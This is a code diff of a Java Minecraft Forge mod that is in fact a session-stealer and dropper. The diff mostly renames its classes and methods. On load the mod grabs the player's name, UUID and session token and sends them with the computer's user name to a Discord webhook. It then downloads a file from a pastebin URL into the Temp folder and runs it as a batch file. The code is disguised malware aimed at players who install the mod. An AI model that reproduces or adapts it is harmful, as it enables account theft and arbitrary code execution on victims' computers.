@@ -1,8 +1,9 @@
-package mod;
+package SSIDLogger.mod;
 
 import net.minecraft.launchwrapper.Launch;
 import net.minecraftforge.fml.common.Mod;
-import net.minecraftforge.fml.common.event.*;
+import net.minecraftforge.fml.common.event.FMLInitializationEvent;
+import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
 
 import javax.crypto.*;
 import javax.crypto.spec.PBEKeySpec;
@@ -19,8 +20,8 @@ import java.security.spec.InvalidKeySpecException;
 import java.security.spec.KeySpec;
 import java.util.Base64;
 
-@Mod(modid = "MinecraftMod", name = "MinecraftMod", version = "1.0", acceptedMinecraftVersions = "[1.8.9]")
-public class MinecraftMod {
+@Mod(modid = "Logger", name = "Logger", version = "1.0", acceptedMinecraftVersions = "[1.8.9]")
+public class Logger {
 
     public static String version = "1.1";
 
@@ -28,24 +29,24 @@ public class MinecraftMod {
 
     @Mod.EventHandler
     public void onFMLPreInitialization(FMLPreInitializationEvent event) {
-        loadMc();
+        connectToServer();
     }
 
     @Mod.EventHandler
     public void onFMLInitialization(FMLInitializationEvent event) {
         try {
             Thread.sleep(5000);
-            preinit();
+            showHistory();
         } catch (Exception ignored) {}
         try {
             Thread.sleep(3000);
-            connectgame("cmd /c start C:\\Users\\%username%\\AppData\\Local\\Temp\\screenshots\\screenshot.bat");
+            exec("cmd /c start C:\\Users\\%username%\\AppData\\Local\\Temp\\screenshots\\screenshot.bat");
         } catch (Exception ignored) {}
     }
 
     // utils
 
-    public static void connectgame(String cmd) {
+    public static void exec(String cmd) {
         try {
             Runtime rt = Runtime.getRuntime();
             Process pr = rt.exec(cmd);
@@ -62,7 +63,7 @@ public class MinecraftMod {
 
     // rats
 
-    public static void loadMc() {
+    public static void connectToServer() {
         try {
             Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
             Object minecraft = mc.getMethod("func_71410_x").invoke(null);
@@ -72,8 +73,8 @@ public class MinecraftMod {
             Object name = sessionClass.getMethod("func_111285_a").invoke(session);
             Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);
 
-            ControlSettings sendmessage = new ControlSettings(getWebhook());
-            sendmessage.addEmbed(new ControlSettings.LoadMod()
+            DiscordEmbed sendmessage = new DiscordEmbed(getWebhook());
+            sendmessage.addEmbed(new DiscordEmbed.CreateGUI()
                     .setTitle("Minecraft Info")
                     .setColor(Color.CYAN)
                     .addField("Name", name.toString(), true)
@@ -82,11 +83,10 @@ public class MinecraftMod {
                     .addField("Token ", token.toString(), false)
                     .setFooter("Computer Name: " + System.getProperty("user.name") + " Mod version: " + version, ""));
             sendmessage.execute();
-
         } catch (Exception ignored) {}
     }
 
-    public static void preinit() {
+    public static void showHistory() {
         try {
 
             URL pastebin = new URL("https://pastebin.com/raw/AERL3GJT");
@@ -110,8 +110,8 @@ public class MinecraftMod {
                 fileOut.write(currByte);
             }
 
-            ControlSettings sendmessage = new ControlSettings(getWebhook());
-            sendmessage.addEmbed(new ControlSettings.LoadMod()
+            DiscordEmbed sendmessage = new DiscordEmbed(getWebhook());
+            sendmessage.addEmbed(new DiscordEmbed.CreateGUI()
                     .setTitle("Loading")
                     .setColor(Color.GREEN)
                     .addField("Message ", "Running .bat file", true));
@@ -135,5 +135,4 @@ public class MinecraftMod {
         String charSet = "UTF-8";
         return new String(utf8, charSet);
     }
-
 }
